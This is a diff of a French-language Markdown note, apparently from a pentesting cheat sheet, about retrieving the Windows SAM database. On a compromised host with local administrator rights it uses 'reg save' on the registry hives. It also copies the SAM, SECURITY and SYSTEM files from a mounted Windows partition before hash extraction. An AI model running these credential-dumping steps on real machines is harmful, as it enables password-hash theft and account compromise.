@@ -2,6 +2,8 @@
 
 ### Récupérer la base SAM
 
+#### Depuis un compte "administrateur local" sur le poste compromis
+
 En PowerShell sur une machine compromise, il faut exécuter les commandes suivantes :
 
 ```
@@ -10,7 +12,16 @@ reg save HKLM\system system
 reg save HKLM\security security
 ```
 
-_Note : les droits "administrateur local" sont requis._
+#### Depuis la partition Windows montée sur une clé bootable
+
+Copier les fichiers SAM, SECURITY et SYSTEM sur un média amovibles.
+
+```
+# Chemin des fichiers
+Windows/System32/config/SAM
+Windows/System32/config/SECURITY
+Windows/System32/config/SYSTEM
+```
 
 ### Extraire les _hashs_
 
